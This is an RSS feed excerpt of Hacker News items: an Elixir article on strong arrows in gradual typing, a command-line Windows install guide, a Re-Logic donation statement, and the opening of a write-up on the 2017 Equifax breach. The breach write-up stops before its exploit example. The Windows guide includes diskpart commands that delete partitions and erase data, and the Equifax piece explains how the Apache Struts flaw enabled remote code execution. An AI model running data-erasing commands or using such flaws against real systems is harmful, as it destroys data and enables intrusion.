driver
[on which we
<a href="https://www.undeadly.org/cgi?action=article;sid=20230421124221">reported earlier</a>]
is needed.</p>

<p>Head on over to <a href="https://www.cambus.net/openbsd-arm64-on-hetzner-cloud/">Frederic's blog</a> for the full story!</p>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Strong arrows: a new approach to gradual typing (158 pts)]]></title>
            <link>https://elixir-lang.org/blog/2023/09/20/strong-arrows-gradual-typing/</link>
            <guid>37593967</guid>
            <pubDate>Thu, 21 Sep 2023 06:39:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://elixir-lang.org/blog/2023/09/20/strong-arrows-gradual-typing/">https://elixir-lang.org/blog/2023/09/20/strong-arrows-gradual-typing/</a>, See on <a href="https://news.ycombinator.com/item?id=37593967">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
        <p><em>This is article expands on the topic of gradual set-theoretic typing discussed during my keynote at <a href="https://www.youtube.com/watch?v=giYbq4HmfGA">ElixirConf US 2023</a>.</em></p>

<p>There is an on-going effort <a href="https://elixir-lang.org/blog/2023/06/22/type-system-updates-research-dev/">to research and develop a type system for Elixir</a>, lead by <a href="https://www.irif.fr/~gc/">Giuseppe Castagna</a>, CNRS Senior Researcher, and taken by <a href="https://www.irif.fr/users/gduboc/index">Guillaume Duboc</a> as part of his PhD studies.</p>

<p>In this article, we will discuss how the proposed type system will tackle gradual typing and how it relates to set-theoretic types, with the goal of providing an introduction to the ideas <a href="https://arxiv.org/abs/2306.06391">presented in our paper</a>.</p>

<h2 id="set-theoretic-types">Set-theoretic types</h2>

<p>The type system we are currently researching and developing for Elixir is based on set-theoretic types, which is to say its operations are based on the fundamental set operations of union, intersection, and negation.</p>

<p>For example, the atom <code>:ok</code> is a value in Elixir, that can be represented by the type <code>:ok</code>. All atoms in Elixir as represented by themselves in the type system. A function that returns either <code>:ok</code> or <code>:error</code> is said to return <code>:ok or :error</code>, where the <code>or</code> operator represents the union.</p>

<p>The types <code>:ok</code> and <code>:error</code> are contained by the type <code>atom()</code>, which is an infinite set representing all atoms. The union of the types <code>:ok</code> and <code>atom()</code> can be written as <code>:ok or atom()</code>, and is equivalent to <code>atom()</code> (as <code>:ok</code> is a subset of <code>atom()</code>). The intersection of the types <code>:ok</code> and <code>atom()</code> can be written as <code>:ok and atom()</code>, and is equivalent to <code>:ok</code>.</p>

<p>Similarly, <code>integer()</code> is another infinite set representing all integers. <code>integer() or atom()</code> is the union of all integers and atoms. The intersection <code>integer() and atom()</code> is an empty set, which we call <code>none()</code>. The union of all types that exist in Elixir is called <code>term()</code>.</p>

<p>The beauty of set-theoretic types is that we can model many interesting properties found in Elixir programs on top of those fundamental set operations, which in turn we hope to make typing in Elixir both more expressive and accessible. Let’s see an example of how a type system feature, called bounded quantification (or bounded polymorphism), can be implemented with set-theoretic types.</p>

<h2 id="upper-and-lower-bounds">Upper and lower bounds</h2>

<p>The <code>identity</code> function is a function that receives an argument and returns it as is. In Java, it would be written as follows:</p>

<div><pre><code><span>static</span> <span>&lt;</span><span>T</span><span>&gt;</span> <span>T</span> <span>identity</span><span>(</span><span>T</span> <span>arg</span><span>)</span> <span>{</span>
    <span>return</span> <span>arg</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>In TypeScript:</p>

<div><pre><code><span>function</span> <span>identity</span><span>&lt;</span><span>T</span><span>&gt;</span><span>(</span><span>arg</span><span>:</span> <span>T</span><span>):</span> <span>T</span> <span>{</span>
  <span>return</span> <span>arg</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Or in Haskell:</p>

<div><pre><code><span>id</span> <span>::</span> <span>a</span> <span>-&gt;</span> <span>a</span>
<span>id</span> <span>arg</span> <span>=</span> <span>arg</span>
</code></pre></div>

<p>In all of the examples above, we say the function receives an argument of type variable <code>T</code> (or type variable <code>a</code> in Haskell’s case) and return a value of the same type <code>T</code>. We call this parametric polymorphism, because the function parameter - its argument - can take many (poly) shapes (morphs). In Elixir, we could then support:</p>

<div><pre><code><span>$</span> <span>a</span> <span>-&gt;</span> <span>a</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>
</code></pre></div>

<p>Sometimes we may want to further constrain those type variables. As example, let’s constraint the identity function in Java to numbers:</p>

<div><pre><code><span>static</span> <span>&lt;</span><span>T</span> <span>extends</span> <span>Number</span><span>&gt;</span> <span>T</span> <span>identity</span><span>(</span><span>T</span> <span>arg</span><span>)</span> <span>{</span>
    <span>return</span> <span>arg</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>Or in TypeScript:</p>

<div><pre><code><span>function</span> <span>identity</span><span>&lt;</span><span>T</span> <span>extends</span> <span>number</span><span>&gt;</span><span>(</span><span>arg</span><span>:</span> <span>T</span><span>):</span> <span>T</span> <span>{</span>
    <span>return</span> <span>arg</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>In Haskell, we can constrain to a typeclass, such as <code>Ord</code>:</p>

<div><pre><code><span>id</span> <span>::</span> <span>Ord</span> <span>a</span> <span>=&gt;</span> <span>a</span> <span>-&gt;</span> <span>a</span>
<span>id</span> <span>x</span> <span>=</span> <span>x</span>
</code></pre></div>

<p>In order words, these functions can accept any type as long as they fullfil a given constraint. This in turn is called bounded polymorphism, because we are putting bounds on the types we can receive.</p>

<p>With all that said, how can we implement bounded polymorphism in set-theoretic types? Imagine we have a type variable <code>a</code>, how can we ensure it is bounded or constrained to another type?</p>

<p>With set-theoretic types, this operation is an intersection. If you have <code>a and atom()</code>, <code>a</code> can be the type <code>:foo</code>. <code>a</code> can also be the type <code>atom()</code>, which represents all atom types, but <code>a</code> cannot be <code>integer()</code>, as <code>integer() and atom()</code> will return an empty set. In other words, there is no need to introduce a new semantic construct, as intersections can be used to place upper bounds in type variables! Therefore, we could restrict Elixir’s identity function to numbers like this:</p>

<div><pre><code><span>$</span> <span>a</span> <span>and</span> <span>number</span><span>()</span> <span>-&gt;</span> <span>a</span> <span>and</span> <span>number</span><span>()</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>
</code></pre></div>

<p>Or course, we can provide syntax sugar for those constraints:</p>

<div><pre><code><span>$</span> <span>a</span> <span>-&gt;</span> <span>a</span> <span>when</span> <span>a:</span> <span>number</span><span>()</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>
</code></pre></div>

<p>But at the end of the day it will simply expand to intersections. The important bit is that, at the semantic level, there is no need for additional constructs and representations.</p>

<blockquote>
  <p>Note: for the type-curious readers, set-theoretic types implement <a href="http://lucacardelli.name/Papers/OnUnderstanding.pdf">a limited form of bounded quantification <em>à la</em> Kernel Fun</a>. In a nutshell, it means we can only compare functions if they have the same bounds. For example, our type system states <code>a -&gt; a when a: integer() or boolean()</code> is not a subtype of <code>a -&gt; a when a: integer()</code>.</p>
</blockquote>

<p>We also get lower bounds for free. If intersections allow us to place an upper bound on a type variable, a union is equivalent to a lower bound as it specifies the type variable will always be augmented by the union-ed type. For example, <code>a or atom()</code> says the result will always include atoms plus whatever else specified by <code>a</code> (which may be an atom, <code>atom()</code> itself, or a completely disjoint type such as <code>integer()</code>).</p>

<p>Elixir protocols, which is an Elixir construct equivalent to Haskell Typeclasses or Java interfaces, is another example of functionality that can be modelled and composed with set-theoretic types without additional semantics. The exact mechanism to do so is left as an exercise to the reader (or the topic of a future blog post).</p>

<h2 id="enter-gradual-typing">Enter gradual typing</h2>

<p>Elixir is a functional dynamic programming language. Existing Elixir programs are untyped, which means that a type system needs mechanisms to interface existing Elixir code with future statically typed Elixir code. We can achieve this with gradual typing.</p>

<p>A gradual type system is a type system that defines a <code>dynamic()</code> type. It is sometimes written as <code>?</code> and sometimes known as the <code>any</code> type (but I prefer to avoid <code>any</code> because it is too short and too lax in languages like TypeScript).</p>

<p>In Elixir, the <code>dynamic()</code> type means the type is only known at runtime, effectively disabling static checks for that type. More interestingly, we can also place upper and lower bounds on the dynamic type using set operations. As we will soon learn, this will reveal interesting properties about our type system.</p>

<p>It is often said that gradual typing is the best of both words. Perhaps ironically, that’s true and false at the same time. If you use a gradual type system but you never use the <code>dynamic()</code> type, then it behaves exactly like a static type system. However, the more you use the <code>dynamic()</code> type, the fewer guarantees the type system will give you, the more the <code>dynamic()</code> type propagates through the system. Therefore, it is in our interest to reduce the occurrences of the <code>dynamic()</code> type as much as possible, and that’s what we set out to do.</p>

<h2 id="interfacing-static-and-dynamic-code-the-trouble-with-dynamic">Interfacing static and dynamic code: the trouble with <code>dynamic()</code></h2>

<p>Let’s go back to our constrained identity function that accepts only numbers:</p>

<div><pre><code><span>$</span> <span>a</span> <span>-&gt;</span> <span>a</span> <span>when</span> <span>a:</span> <span>number</span><span>()</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>
</code></pre></div>

<p>Now imagine that we have some untyped code that calls this function:</p>

<div><pre><code><span>def</span> <span>debug</span><span>(</span><span>arg</span><span>)</span> <span>do</span>
  <span>"we got: "</span> <span>&lt;&gt;</span> <span>identity</span><span>(</span><span>arg</span><span>)</span>
<span>end</span>
</code></pre></div>

<p>Since <code>debug/1</code> is untyped, its argument will receive the type <code>dynamic()</code>.</p>

<p><code>debug/1</code> proceeds to call <code>identity</code> with an argument and then uses the string concatenation operator (<code>&lt;&gt;</code>) to concatenate <code>"we got: "</code> to the result of <code>identity(arg)</code>. Since <code>identity/1</code> is meant to return a number and string concatenation requires two strings as operands, there is a typing error in this program. On the other hand, if you call <code>debug("hello")</code> at runtime, the code will work and won’t raise any exceptions.</p>

<p>In other words, the static typing version of the program and its runtime execution do not match in behaviour. So how do we tackle this?</p>

<p>One option is to say that’s all behaving as expected. If <code>debug/1</code> is untyped, its <code>arg</code> has the <code>dynamic()</code> type. To type check this program, we specify that <code>identity(dynamic())</code> returns the <code>dynamic()</code> type, the concatenation of a string with <code>dynamic()</code> also returns <code>dynamic()</code>, and consequently <code>debug/1</code> gets the type <code>dynamic() -&gt; dynamic()</code>, with no type errors emitted.</p>

<p>The trouble is: this is not a very useful choice. Once <code>dynamic()</code> enters the system, it <em>spreads everywhere</em>, we perform fewer checks, effectively discarding the information that <code>identity/1</code> returns a number, and the overall type system becomes less useful.</p>

<p>Another option would be for us to say: once we call a statically typed function with <code>dynamic()</code>, we will ignore the <code>dynamic()</code> type. If the function says it returns a <code>number()</code>, then it will surely be a number! In this version, <code>identity(dynamic())</code> returns <code>number()</code> and the type system will catch a type error when concatenating a string with a number.</p>

<p>This is similar to the approach taken by TypeScript. This means we can perform further static checks, but it also means we can call <code>debug("foobar")</code> and that will return the string <code>"we got: foobar"</code>! But how can that be possible when the type system told us that <code>identity</code> returns a <code>number()</code>? This can lead to confusion and surprising results at runtime. We say this system is unsound, because the types at runtime do not match our compile-time types.</p>

<p>None of our solutions so far attempted to match the static and runtime behaviors, but rather, they picked one in favor of the other.</p>

<p>But don’t despair, there is yet another option. We could introduce runtime checks whenever we cross the “dynamic &lt;-&gt; static” boundaries. In this case, we could say <code>identity(dynamic())</code> returns a <code>number()</code>, but we will introduce a runtime check into the code to guarantee that’s the case. This means we get static checks, we ensure the value is correct at runtime, with the cost of introducing additional checks at runtime. Unfortunately, those checks may affect performance, depending on the complexity of the data structure and on how many times we cross the “dynamic &lt;-&gt; static” boundary.</p>

<blockquote>
  <p>Note: there is <a href="https://arxiv.org/abs/2206.13831">recent research in using the runtime checks introduced by a gradual type system to provide compiler optimizations</a>. Some of these techniques are already leveraged by the Erlang VM to optimize code based on patterns and guards.</p>
</blockquote>

<p>To summarize, we have three options:</p>

<ul>
  <li>
    <p>Calling static code from dynamic code returns <code>dynamic()</code>, dropping the opportunity of further static typing checks (this is sound)</p>
  </li>
  <li>
    <p>Calling static code from dynamic code returns the static types, potentially leading to mismatched types at runtime (this is unsound)</p>
  </li>
  <li>
    <p>Calling static code from dynamic code returns the static types with additional runtime checks, unifying both behaviours but potentially impacting performance (this is sound)</p>
  </li>
</ul>

<h2 id="introducing-strong-arrows">Introducing strong arrows</h2>

<p>I have always said that Elixir, thanks to Erlang, is an assertive language. For example, if our identity function is restricted to only numbers, in practice we would most likely write it as:</p>

<div><pre><code><span>$</span> <span>a</span> <span>-&gt;</span> <span>a</span> <span>when</span> <span>a:</span> <span>number</span><span>()</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>)</span> <span>when</span> <span>is_number</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>
</code></pre></div>

<p>In the example above, <code>identity</code> will fail if given any value that is not a number. We often rely on pattern matching and guards and, in turn, they helps us assert on the types we are working with. Not only that, Erlang’s JIT compiler already relies on this information to <a href="https://www.erlang.org/blog/type-based-optimizations-in-the-jit/">perform optimizations</a> whenever possible.</p>

<p>We also say Elixir is strongly typed because its functions and operators avoid implicit type conversions. The following functions also fail when their input does not match their type:</p>

<div><pre><code><span>$</span> <span>binary</span><span>()</span> <span>-&gt;</span> <span>binary</span><span>()</span>
<span>def</span> <span>debug</span><span>(</span><span>string</span><span>),</span> <span>do</span><span>:</span> <span>"we got: "</span> <span>&lt;&gt;</span> <span>string</span>

<span>$</span> <span>(</span><span>integer</span><span>()</span> <span>-&gt;</span> <span>integer</span><span>())</span> <span>and</span> <span>(</span><span>float</span><span>()</span> <span>-&gt;</span> <span>float</span><span>())</span>
<span>def</span> <span>increment</span><span>(</span><span>number</span><span>),</span> <span>do</span><span>:</span> <span>number</span> <span>+</span> <span>1</span>
</code></pre></div>

<p><code>&lt;&gt;</code> only accepts binaries as arguments and will raise otherwise. <code>+</code> only accepts numbers (integers or floats) and will raise otherwise. <code>+</code> does not perform implicit conversions of non-numeric types, such as strings to number, as we can see next:</p>

<div><pre><code><span>iex</span><span>(</span><span>1</span><span>)</span><span>&gt;</span> <span>increment</span><span>(</span><span>1</span><span>)</span>
<span>2</span>
<span>iex</span><span>(</span><span>2</span><span>)</span><span>&gt;</span> <span>increment</span><span>(</span><span>13.0</span><span>)</span>
<span>14.0</span>
<span>iex</span><span>(</span><span>3</span><span>)</span><span>&gt;</span> <span>increment</span><span>(</span><span>"foobar"</span><span>)</span>
<span>**</span> <span>(</span><span>ArithmeticError</span><span>)</span> <span>bad</span> <span>argument</span> <span>in</span> <span>arithmetic</span> <span>expression:</span> <span>"foobar"</span> <span>+</span> <span>1</span>
</code></pre></div>

<p>In other words, Elixir’s runtime consistently checks the values and their types at runtime. If <code>increment</code> fails when given something else than a number, then it will fail when the <code>dynamic()</code> type does not match its input at runtime. This guarantees <code>increment</code> returns its declared type and therefore we do not need to introduce runtime type checks when calling said function from untyped code.</p>

<p>When we look at the <code>identity</code>, <code>debug</code>, and <code>increment</code> functions above, we - as developers - can state that these functions raise when given a value that does not match their input. However, how can we generalize this property so it is computed by the type system itself? To do so, we introduce a new concept called <strong>strong arrows</strong>, which relies on set-theoretical types to derive this property.</p>

<p>The idea goes as follows: a strong arrow is a function that can be statically proven that, when evaluated on values outside of its input types (i.e. its domain), it will error. For example, in our <code>increment</code> function, if we pass a <code>string()</code> as argument, it won’t type check, because <code>string() + integer()</code> is not a valid operation. Thanks to set-theoretic types, we can compute all values outside of the domain by computing the negation of a set. Given <code>increment/1</code> will fail for all types which are <code>not number()</code>, the function is strong.</p>

<p>By applying this rule to all typed functions, we will know which functions are strong and which ones are not. If a function is strong, the type system knows that calling it with a <code>dynamic()</code> type will always evaluate to its return type! Therefore we say the return type of <code>increment(dynamic())</code> is <code>number()</code>, which is sound and does not need further runtime checks!</p>

<p>Going back to our <code>debug</code> function, when used with a guarded identity, it will be able emit warnings at compile-time, errors at runtime, without introducing any additional runtime check:</p>

<div><pre><code><span>$</span> <span>a</span> <span>-&gt;</span> <span>a</span> <span>when</span> <span>a:</span> <span>number</span><span>()</span>
<span>def</span> <span>identity</span><span>(</span><span>arg</span><span>)</span> <span>when</span> <span>is_number</span><span>(</span><span>arg</span><span>),</span> <span>do</span><span>:</span> <span>arg</span>

<span>def</span> <span>debug</span><span>(</span><span>arg</span><span>)</span> <span>do</span>
  <span>"we got: "</span> <span>&lt;&gt;</span> <span>identity</span><span>(</span><span>arg</span><span>)</span>
<span>end</span>
</code></pre></div>

<p>However, if the <code>identity</code> function is not strong, then we must fallback to one of the strategies in the previous section.</p>

<p>Another powerful property of strong arrows is that they are composable. Let’s pick an example from the paper:</p>

<div><pre><code><span>$</span> <span>number</span><span>(),</span> <span>number</span><span>()</span> <span>-&gt;</span> <span>number</span><span>()</span>
<span>def</span> <span>subtract</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>)</span> <span>do</span>
  <span>a</span> <span>+</span> <span>negate</span><span>(</span><span>b</span><span>)</span>
<span>end</span>

<span>$</span> <span>number</span><span>()</span> <span>-&gt;</span> <span>number</span><span>()</span>
<span>def</span> <span>negate</span><span>(</span><span>int</span><span>),</span> <span>do</span><span>:</span> <span>-</span><span>int</span>
</code></pre></div>

<p>In the example above, <code>negate/1</code>’s type is a strong arrow, as it raises for any input outside of its domain. <code>subtract/2</code>’s type is also a strong arrow, because both <code>+</code> and our own <code>negate</code> are strong arrows too. This is an important capability as it limits how <code>dynamic()</code> types spread throughout the system.</p>

<blockquote>
  <p>Errata: my presentation used the type <code>integer()</code> instead of <code>number()</code> for the example above. However, that was a mistake in the slide. Giving the type <code>integer(), integer() -&gt; integer()</code> to <code>subtract</code> and <code>integer() -&gt; integer()</code> to <code>negate</code> does not make <code>subtract</code> a strong arrow. Can you tell why?</p>
</blockquote>

<p>Luckily, other gradually typed languages can also leverage strong arrows. However, the more polymorphic a language and its functions are, the more unlikely it is to conclude that a given function is strong. For example, in other gradually typed languages such as Python or Ruby, the <code>+</code> operator is extensible and the user can define custom types where the operation is valid. In TypeScript, <code>"foobar" + 1</code> is also a valid operation, which expands the function domain. In both cases, an <code>increment</code> function restricted to numbers would not have a strong arrow type, as the operator won’t fail for all types outside of <code>number()</code>. Therefore, to remain sound, they must either restrict the operands with further runtime checks or return <code>dynamic()</code> (reducing the number of compile-time checks).</p>

<p>There is one last scenario to consider, which I did not include during my keynote for brevity. Take this function:</p>

<div><pre><code><span>$</span> <span>integer</span><span>()</span> <span>-&gt;</span> <span>:ok</span>
<span>def</span> <span>receives_integer_and_returns_ok</span><span>(</span><span>_arg</span><span>),</span> <span>do</span><span>:</span> <span>:ok</span>
</code></pre></div>

<p>The function above can receive any type and return <code>:ok</code>. Is its type a strong arrow? Well, according to our definition, it is not. If we negate its input, type checking does not fail, it returns <code>:ok</code>.</p>

<p>However, given the return type is always the same, it should be a strong arrow! To do so, let’s amend and rephrase our definition of strong arrows: we negate the domain (i.e. the inputs) of a function and then type check it. If the function returns <code>none()</code> (i.e. it does not type check) or a type which is a subset of its codomain (i.e. its output), then it is a strong arrow.</p>

<h2 id="gradual-typing-and-false-positives">Gradual typing and false positives</h2>

<p>There is one last scenario we must take into consideration when interfacing dynamic and static code. Imagine the following code:</p>

<div><pre><code><span>def</span> <span>increment_and_remainder</span><span>(</span><span>numerator</span><span>,</span> <span>denominator</span><span>)</span> <span>do</span>
  <span>rem</span><span>(</span><span>numerator</span><span>,</span> <span>increment</span><span>(</span><span>denominator</span><span>))</span>
<span>end</span>

<span>$</span> <span>(</span><span>integer</span><span>()</span> <span>-&gt;</span> <span>integer</span><span>())</span> <span>and</span> <span>(</span><span>float</span><span>()</span> <span>-&gt;</span> <span>float</span><span>())</span>
<span>def</span> <span>increment</span><span>(</span><span>number</span><span>),</span> <span>do</span><span>:</span> <span>number</span> <span>+</span> <span>1</span>
</code></pre></div>

<p>The <code>increment_and_remainder/2</code> function is untyped, therefore both of its arguments receive type <code>dynamic()</code>. The function then computes the remainder of the numerator by the denominator incremented by one. For this example, let’s assume all uses of <code>increment_and_remainder/2</code> in our program passes two integers as arguments.</p>

<p>Given <code>increment/1</code> has a strong arrow type, according to our definition, <code>increment(dynamic())</code> will return <code>integer() or float()</code> (also known as <code>number()</code>). Here lies the issue: if <code>increment(dynamic())</code> returns <code>integer() or float()</code>, the program above won’t type check because <code>rem/2</code> does not accept floats.</p>

<p>When faced with this problem, there are two possible reactions:</p>

<ol>
  <li>
    <p>It is correct for the function to not type check given <code>increment</code> may return a float</p>
  </li>
  <li>
    <p>It is incorrect for the function to not type check because the error it describes never occurs in the codebase</p>
  </li>
</ol>

<p>Another interesting property of gradual set-theoretic types is that we can also place upper bounds on the <code>dynamic()</code> type. If a function returns <code>number()</code>, it means the caller needs to handle both <code>integer()</code> and <code>float()</code>. However, if a function returns <code>dynamic() and number()</code>, it means the type is defined at runtime, but it must still verify it is one of <code>integer()</code> or <code>float()</code> at compile time.</p>

<p>Therefore, <code>rem/2</code> will type check if its second argument has the type <code>dynamic() and number()</code>, as there is one type at runtime (<code>integer()</code>) that satisfies type checking. On the other hand, if you attempt to use the string concatenation operator (<code>&lt;&gt;</code>) on <code>dynamic() and number()</code>, then there is no acceptable runtime type and you’d still get a typing violation!</p>

<p>Going back to strong arrows, there are two possible return types from a strong arrow:</p>

<ol>
  <li>
    <p>A strong arrow, when presented with a dynamic type, returns its codomain</p>
  </li>
  <li>
    <p>A strong arrow, when presented with a dynamic type, returns the intersection of the codomain with the <code>dynamic()</code> type</p>
  </li>
</ol>

<p>The second option opens up the possibility for existing codebases to gradually migrate to static types without dealing with false positives. Coming from a dynamic background, false positives can be seen as noisy or as an indication that static types are not worth the trouble. With strong arrows and gradual set-theoretic types, we will be able to explore different trade-offs on mixed codebases. Which of the two choices above we will adopt as a default and how to customize them is yet to be decided. It will depend on the community feedback as we experiment and integrate the type system.</p>

<p>Erlang and Elixir developers who use Dialyzer will be familiar with these trade-offs, as the second option mirrors Dialyzer’s behaviour of no false positives. The difference here is that our semantics are integrated into a complete type system. If no type signature is present, the <code>dynamic()</code> type is used, and we will leverage the techniques described here to interface dynamic and static code. If a function has a type signature, and no <code>dynamic()</code> type is present, then it will behave as statically typed code when called with statically typed arguments. Migrating to static types will naturally reduce the interaction points between dynamic and static code, removing the reliance on the <code>dynamic()</code> type.</p>

<h2 id="summary">Summary</h2>

<p>Set-theoretic types allow us to express many typing features based on set operations of union, intersection, and negation.</p>

<p>In particular, we have been exploring a gradual set-theoretic type system for Elixir, paying special attention to how the type system will integrate with existing codebases and how it can best leverage the semantics of the Erlang Virtual Machine. The type system will also perform limited inference based on patterns and guards (as described in the paper), which - in addition to strong arrows - we hope to bring some of the benefits of static typing to codebases without changing a single line of code.</p>

<p>While our efforts have officially moved from research into development, and <a href="https://elixir-lang.org/blog/2023/06/22/type-system-updates-research-dev/">we have outlined an implementation plan</a>, we haven’t yet fully implemented nor assessed the usability of set-theoretic types in existing Elixir codebases, nor large nor small. There is much to implement and validate, and we don’t rule the possibility of finding unforeseen deal breakers that could send us back to square one. Yet we are pleased and cautiously excited with the new developments so far.</p>

<p>The development of Elixir’s type system is sponsored by <a href="https://www.fresha.com/">Fresha</a> (<a href="https://www.fresha.com/careers/openings?department=engineering">they are hiring!</a>),
<a href="https://starfish.team/">Starfish*</a> (<a href="https://starfish.team/jobs/experienced-elixir-developer">they are hiring!</a>),
and <a href="https://dashbit.co/">Dashbit</a>.</p>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Install Windows the Arch Linux Way (300 pts)]]></title>
            <link>https://christitus.com/install-windows-the-arch-linux-way/</link>
            <guid>37593459</guid>
            <pubDate>Thu, 21 Sep 2023 05:15:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://christitus.com/install-windows-the-arch-linux-way/">https://christitus.com/install-windows-the-arch-linux-way/</a>, See on <a href="https://news.ycombinator.com/item?id=37593459">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p>Installing Windows strictly through the Command Line is an important tool to have. If windows changes the installer or out of box experience, you can bypass any changes with this guide!</p>
<h2 id="the-installer">The Installer</h2>
<p>Download and Launch the Windows Installer</p>
<p>Launch Command Prompt with <code>Shift+F10</code></p>
<h3 id="partition-both-a-boot-partition-and-data-partition">Partition both a Boot Partition and Data Partition</h3>
<ul>
<li>List Disks with <code>list disk</code></li>
<li>Select desired disk with <code>sel disk #</code></li>
<li>Check to verify there is NO partitions <code>list partition</code></li>
<li>(Optional) Delete any existing partitions <code>del part #</code> <strong>NOTE: THIS ERASES ALL DATA</strong></li>
<li>Check to verify DISK is GPT <code>list disk</code> and use <code>convert gpt</code> if GPT is not enabled <code>*</code></li>
<li>Create Boot partition <code>create partition efi size=100</code></li>
<li>Create Data partition <code>create partition primary size=*</code></li>
<li>Select Boot <code>sel partition 1</code></li>
<li>Format Boot <code>format fs=FAT32 quick</code></li>
<li>Assign Boot partition <code>assign letter=g:</code></li>
<li>Select Data <code>sel par 2</code></li>
<li>Format Data <code>format fs=NTFS quick</code></li>
<li>Assign Data partition <code>assign letter=c:</code> <strong>Note: You may need to UNASSIGN an existing C: drive</strong></li>
</ul>
<h3 id="verify-the-windows-version-to-install">Verify the Windows Version to Install</h3>
<p>DISM is at the heart of every Windows installation. You need to do a verification on your installation ISO to figure out the source index # that you will install.</p>
<div><pre tabindex="0"><code data-lang="fallback"><span><span>DISM /Get-ImageInfo /imagefile:x:\sources\install.wim
</span></span></code></pre></div><p>Note the Index: # that you want to install</p>
<h3 id="install-main-windows-data">Install Main Windows Data</h3>
<p>Now we copy over the operating system in its entirety.</p>
<div><pre tabindex="0"><code data-lang="fallback"><span><span>DISM /apply-image /imagefile:x:\sources\install.wim /index:2 /applydir:c:
</span></span></code></pre></div><h3 id="copy-boot-files-to-efi">Copy Boot Files to EFI</h3>
<p>Copy the boot files to complete the EFI partition to boot into our windows.</p>
<div><pre tabindex="0"><code data-lang="fallback"><span><span>bcdboot c:\Windows /s G: /f ALL
</span></span></code></pre></div><h2 id="bypass-oobe">Bypass OOBE</h2>
<p>The Out of Box Experience is changing all the time. The requirement to be online or only use a Microsoft account. Bypass it with this command and using <code>Shift+F10</code> to bring up the command prompt. <strong>NOTE: DISCONNECT FROM INTERNET before booting!</strong></p>
<p>System will restart after executing the command. Select <code>Continue with limited Setup</code> and name the device and create a local account.</p>
<h2 id="walkthrough-video">Walkthrough Video</h2>

<p>
  <iframe src="https://www.youtube.com/embed/vtxedkuUCas" allowfullscreen="" title="YouTube Video"></iframe>
</p>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Terraria developer bashes Unity, donates $200k to open source alternatives (382 pts)]]></title>
            <link>https://lemm.ee/post/8670706</link>
            <guid>37593133</guid>
            <pubDate>Thu, 21 Sep 2023 04:11:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lemm.ee/post/8670706">https://lemm.ee/post/8670706</a>, See on <a href="https://news.ycombinator.com/item?id=37593133">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Image Text</p>
<p>Re-Logic</p>
<p>The team at Re-Logic has been watching the recent events surrounding Unity with both interest and sadness. The loss of a formerly-leading and user-friendly game engine to the darker forces that negatively impact so much of the gaming industry has left us dismayed to put it mildly. While we do not personally use Unity outside of a few elements on our console/mobile platforms), we feel like we cannot sit idly by as these predatory moves are made against studios everywhere.</p>
<p>We unequivocally condemn and reject the recent TOS/fee changes proposed by Unity and the underhanded way they were rolled out. The flippant manner with which years of trust cultivated by Unity were cast aside for yet another way to squeeze publishers, studios, and gamers is the saddest part. That this move was wholly unnecessary pushes things into the tragedy category - a cautionary tale the industry will not soon forget.</p>
<p>We do not feel that a simple public statement is sufficient. Even if Unity were to recant their policies and statements, the destruction of trust is not so easily repaired. We strongly feel that it is now equally important to get behind some of the other up-and-coming open source game engines. Lighting some candles in an otherwise dark moment. To that end, we are donating $100,000 to each of the open source engines listed below.</p>
<p>Additionally, we are sponsoring each of these projects with $1,000/month each moving forward. All we ask in return is that they remain good people and keep doing all that they can to make these engines powerful and approachable for developers everywhere.</p>
<p>Godot Logo
FNA Logo</p>
<p>Re-Logic has always been supportive of game developers and indie studios that do things the right way. We feel that our actions in this moment are the best way to carry that mission forward - by accelerating and strengthening competing open source game engines, we hope to empower and assist studios that are struggling with how best to proceed given these recent events.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How Equifax Was Breached in 2017 (226 pts)]]></title>
            <link>https://blog.0x7d0.dev/history/how-equifax-was-breached-in-2017/</link>
            <guid>37592934</guid>
            <pubDate>Thu, 21 Sep 2023 03:35:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.0x7d0.dev/history/how-equifax-was-breached-in-2017/">https://blog.0x7d0.dev/history/how-equifax-was-breached-in-2017/</a>, See on <a href="https://news.ycombinator.com/item?id=37592934">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>On a Saturday night, a security engineer at Equifax was updating an SSL certificate on a Network Intrusion Detection System (NIDS). Immediately after, suspicious connections were detected. After a more in-depth investigation, it became evident that the situation was far graver than anticipated. A service had to be promptly shut down to prevent further exploitation, but by that point, the damage was already done. Malicious actors had been exfiltrating data for several months and had already collected personal information from 163 million customers.</p><h2 id="how-it-happened"><span>How It Happened</span><a href="#how-it-happened"><i></i></a></h2><h3 id="initial-access"><span>Initial Access</span><a href="#initial-access"><i></i></a></h3><p>The story begins in March 2017 with the disclosure of a vulnerability in the Apache Struts software, tracked as <a href="https://nvd.nist.gov/vuln/detail/cve-2017-5638">CVE-2017-5638</a>. This security flaw allowed threat actors to achieve remote code execution on a server by crafting a specific <code>Content-Type</code> HTTP header. This vulnerability was ranked highly critical for its high impact potential and the ease with which it could be exploited.</p><p>Here an example running the <code>whoami</code> command on a vulnerable server as detailed in this <a 